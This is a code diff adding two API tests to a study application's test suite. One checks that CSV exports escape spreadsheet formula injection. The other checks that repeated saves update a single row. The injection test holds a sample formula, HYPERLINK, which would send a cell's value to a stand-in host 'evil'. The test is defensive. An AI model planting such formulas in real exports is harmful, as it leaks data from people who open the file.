@@ -236,6 +236,85 @@ describe('Study API', () => {
     });
   });
 
+  describe('CSV formula injection defence', () => {
+    it('escapes payload values starting with =, +, -, or @ so Excel does not execute them', async () => {
+      const start = await request(app)
+        .post('/api/study/start')
+        .set('X-Forwarded-For', '10.99.0.55');
+      const code = start.body.participant_code;
+
+      // Manipulate the payload as a malicious participant would.
+      await request(app)
+        .post('/api/study/save')
+        .send({
+          participant_code: code,
+          payload: {
+            total_coins: '=HYPERLINK("http://evil/?x="&A1,"click")',
+            extinction_chests_opened: 7,
+            start_time: '+1234',
+            end_time: '@SUM(1,1)',
+          },
+        });
+
+      // Pick the experiment that this participant got assigned and export.
+      const stats = await request(app)
+        .get('/api/study/stats')
+        .set('Authorization', `Bearer ${adminToken}`);
+      expect(stats.status).toBe(200);
+
+      const exp = start.body.experiment;
+      const res = await request(app)
+        .get(`/api/study/export/${exp}`)
+        .set('Authorization', `Bearer ${adminToken}`);
+      expect(res.status).toBe(200);
+      // Every cell that starts with =/+/-/@ must be quoted and prefixed with '
+      // so Excel/Sheets/Numbers treat it as a literal string, not a formula.
+      // We check the raw CSV body — the malicious values must NOT appear unprefixed.
+      expect(res.text).not.toMatch(/,=HYPERLINK/);
+      expect(res.text).not.toMatch(/,@SUM/);
+      // The escaped form should appear instead.
+      if (exp === 'treasure_hunt') {
+        expect(res.text).toContain(`"'=HYPERLINK`);
+        expect(res.text).toContain(`"'@SUM`);
+      }
+    });
+  });
+
+  describe('Idempotent /save', () => {
+    it('a second /save for the same participant updates the existing row instead of creating a duplicate', async () => {
+      const start = await request(app)
+        .post('/api/study/start')
+        .set('X-Forwarded-For', '10.99.0.66');
+      const code = start.body.participant_code;
+
+      await request(app)
+        .post('/api/study/save')
+        .send({ participant_code: code, payload: { total_coins: 1 } });
+
+      await request(app)
+        .post('/api/study/save')
+        .send({ participant_code: code, payload: { total_coins: 99 } });
+
+      const finalRows = await db.query(
+        `SELECT COUNT(*)::int AS n FROM study_responses r
+         JOIN study_assignments a ON a.id = r.assignment_id
+         JOIN study_participants p ON p.id = a.participant_id
+         WHERE p.participant_code = $1 AND r.is_snapshot = false`,
+        [code]
+      );
+      expect(finalRows.rows[0].n).toBe(1);
+
+      const latest = await db.query(
+        `SELECT r.payload FROM study_responses r
+         JOIN study_assignments a ON a.id = r.assignment_id
+         JOIN study_participants p ON p.id = a.participant_id
+         WHERE p.participant_code = $1 AND r.is_snapshot = false`,
+        [code]
+      );
+      expect(latest.rows[0].payload.total_coins).toBe(99);
+    });
+  });
+
   describe('Dedup by ip_hash', () => {
     it('rejects a second start within the dedup window if a prior session completed from same IP', async () => {
       const TEST_IP = '10.99.0.42';
